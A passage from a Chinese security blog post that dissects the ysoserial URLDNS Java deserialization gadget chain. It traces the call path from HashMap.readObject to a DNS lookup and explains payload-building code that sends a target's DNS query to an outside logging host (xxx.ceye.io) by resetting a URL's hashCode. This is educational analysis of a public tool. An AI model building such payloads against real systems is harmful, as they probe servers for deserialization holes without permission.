<p>但有一处值得提一下，之前说到URL要传入一个域名而不能是一个IP，IP不会触发DNS查询是在</p>
<p><code>java.net.InetAddress#getAllByName(java.lang.String, java.net.InetAddress)</code>中进行了限制：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName(String host, InetAddress reqAddr)</span><br><span class="line">        <span class="keyword">throws</span> UnknownHostException &#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// if host is an IP address, we won't do further lookup</span></span><br><span class="line">        <span class="keyword">if</span> (Character.digit(host.charAt(<span class="number">0</span>), <span class="number">16</span>) != -<span class="number">1</span></span><br><span class="line">            || (host.charAt(<span class="number">0</span>) == <span class="string">':'</span>)) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] addr = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">int</span> numericZone = -<span class="number">1</span>;</span><br><span class="line">            String ifname = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// see if it is IPv4 address</span></span><br><span class="line">            addr = IPAddressUtil.textToNumericFormatV4(host);</span><br><span class="line">            <span class="keyword">if</span> (addr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
<p>总结一下JDK1.8下的调用路线：</p>
<ol>
<li>HashMap-&gt;readObject() </li>
<li>HashMap-&gt;hash() </li>
<li>URL-&gt;hashCode() </li>
<li>URLStreamHandler-&gt;hashCode() </li>
<li>URLStreamHandler-&gt;getHostAddress() </li>
<li>InetAddress-&gt;getByName()</li>
</ol>
<p>而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：</p>
<ol>
<li>HashMap-&gt;readObject() </li>
<li><strong>HashMap-&gt;putForCreate()</strong></li>
<li>HashMap-&gt;hash()</li>
<li>URL-&gt;hashCode() </li>
<li>之后相同</li>
</ol>
<p>看以上调用过程可以发现：我们要执行的是URL查询的方法<code>URL-&gt;hashCode()</code>，而HashMap只是我们的一层封装。</p>
<h3 id="回看payload生成"><a href="#回看payload生成" class="headerlink" title="回看payload生成"></a>回看payload生成</h3><p>总结以上反序列化过程，我们可以得出要成功完成反序列化过程触发DNS请求，payload需要满足以下2个条件</p>
<ol>
<li>HashMap对象中有一个key为URL对象的键值对</li>
<li>这个URL对象的hashcode需要为-1</li>
</ol>
<p>回头看看测试代码是怎么实现的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxx.ceye.io"</span>);</span><br><span class="line">Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//----</span></span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>); </span><br><span class="line"><span class="comment">//----</span></span><br></pre></td></tr></table></figure>
<p>前面创建hashmap，url对象，由于hashCode是private属性，更改访问权限让它变得允许修改都没问题。</p>
<p>但是下面这块为啥不能直接把URL对象put进去hashmap就好了？反而要设置成别的值再设置回来？</p>
<p>我们需要关注一下<code>java.util.HashMap#put</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现put里面的语句跟我们之前看到的会触发DNS查询的语句一模一样，同时URL对象再初始化之后的hashCode默认为-1。</p>
<p>也就是说在我们生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p>
<p>把<code>f.set(url, 0xdeadbeef);</code>这句话注释了看看：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vz3hfgj312w0sv75w.jpg" alt="回顾payload生成.png"></p>
<p>这时候hashCode默认为-1，然后就会进入<code>hash(key)</code>触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p>
<p>而在put了之后：</p>
<ul>
<li>如果之前没有<code>f.set(url, 0xdeadbeef);</code>修改hashCode，就会完成DNS查询的同时，计算出hashCode，从而修改成不为-1的值。这个hashcode会被序列化传输，到对方机器时就会因为不是-1而跳过DNS查询流程</li>
<li>如果之前修改了hashCode，那自然也会直接被序列化传输，不是-1也会跳过DNS查询流程。</li>
</ul>
<p>所以需要<code>f.set(url, -1);</code>把这个字段改回来-1。</p>
<h3 id="看看Ysoserial是怎么做的"><a href="#看看Ysoserial是怎么做的" class="headerlink" title="看看Ysoserial是怎么做的"></a>看看Ysoserial是怎么做的</h3><p>我们可以使用JAR调试的第三种方法，JAR源代码调试去看看Ysoserial的实现细节。（git clone Ysoserial项目来获取源码）</p>
<p>在<code>ysoserial.payloads.URLDNS#getObject</code>处下断点调试：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SilentURLStreamHandler 是一个自主写的避免生成payload的时候形成URL查询的骚操作，我们之后会分析。</span></span><br><span class="line">    <span class="comment">//用这种骚操作的前提是URL对象的handler属性是transient类型；</span></span><br><span class="line">    <span class="comment">//这代表我们自主写的骚操作不会被写入反序列化的代码中，不会对结果造成影响</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">	<span class="comment">//来一个HashMap</span></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); </span><br><span class="line">    <span class="comment">//再来一个URL对象，这里把SilentURLStreamHandler这个handler传入进去，等会看看做了啥</span></span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">//传入的URL是我们传入的DNS查询的目标</span></span><br><span class="line">    <span class="comment">//URL作为key值和HashMap duang~ 此处的value值是可以随便设置的，这里设置为url</span></span><br><span class="line">    ht.put(u, url); </span><br><span class="line">	<span class="comment">//按照我们之前分析，以上的put操作讲道理会触发一次DNS查询</span></span><br><span class="line">    <span class="comment">//这里使用了SilentURLStreamHandler的骚操作进行避免，但是同样为URL对象计算保存了一个hashCode</span></span><br><span class="line">    <span class="comment">//所以为了在对方机器上DNS成功，在这里重置一下hashCode为-1</span></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体看看SilentURLStreamHandler是怎么做的：<code>ysoserial.payloads.URLDNS.SilentURLStreamHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><code>SilentURLStreamHandler</code>类继承了<code>URLStreamHandler</code>类，然后写了个空的<strong>getHostAddress</strong>方法。</p>
<p>根据JAVA的继承子类的同名方法会覆盖父类方法的原则，这个骚操作的思路大概就是本来执行<code>URLStreamHandler.getHostAddress</code>我们写一个URLStreamHandler的子类<code>SilentURLStreamHandler</code>的getHostAddress，然后啥都不做，这样就不会在生成payload的时候去请求DNS。</p>
<p>来用调试过程来证实一下：</p>
<p>先把自定义的SilentURLStreamHandler塞到URL对象中：<code>URL u = new URL(null, url, handler);</code></p>
<p><code>java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)#605行</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vhwypaj31cm0u9gnr.jpg" alt="handler.png"></p>
<p>然后在<code>ht.put(u, url);</code>中，按照预定的路径HashMap-&gt;hash()、URL-&gt;hashCode()、URLStreamHandler-&gt;hashCode()。之后就遇到了getHostAddress(u)</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vnnmt5j31mj13cq99.jpg" alt="getHostAddress.png"></p>
<p>但是从左下角的调用栈就可以看到，之后不是进入<code>URLStreamHandler-&gt;getHostAddress()</code>而是<code>SilentURLStreamHandler#getHostAddress</code>，这将会返回NULL。</p>
<p>至此Ysoserial用一个子类继承完成了规避DNSLOG；而测试代码用先改变HashCode完成了规避DNSLOG。</p>
<p>讲道理应该后者简单方便一点，但是总感觉Ysoserial的方法有种秘之炫技和优雅。</p>
<p>这就是大佬么，膜了膜了，爱了爱了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7157" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157</a></p>
<p><a href="http://www.lmxspace.com/2019/12/20/ysoserial-C3P0/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" target="_blank" rel="noopener">http://www.lmxspace.com/2019/12/20/ysoserial-C3P0/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12378269.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12378269.html</a></p>
<p>知识星球-代码审计：Java安全漫谈 - 08.反序列化篇(2)</p>
<blockquote>
<p>本文由安全客原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201762</a><br>安全客 - 有思想的安全新媒体</p>
</blockquote>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在IDEA中JAR的三种调试方式"><span class="toc-number">2.</span> <span class="toc-text">在IDEA中JAR的三种调试方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR起端口的远程调试"><span class="toc-number">2.1.</span> <span class="toc-text">JAR起端口的远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试器起端口的远程调试"><span class="toc-number">2.2.</span> <span class="toc-text">调试器起端口的远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR源代码调试"><span class="toc-number">2.3.</span> <span class="toc-text">JAR源代码调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">3.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap"><span class="toc-number">3.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化过程"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#回看payload生成"><span class="toc-number">3.3.</span> <span class="toc-text">回看payload生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看看Ysoserial是怎么做的"><span class="toc-number">3.4.</span> <span class="toc-text">看看Ysoserial是怎么做的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&text=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&is_video=false&description=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JAVA反序列化-ysoserial-URLDNS&body=Check out this article: http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&name=JAVA反序列化-ysoserial-URLDNS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 LaLa
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'lalajun';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
</html>
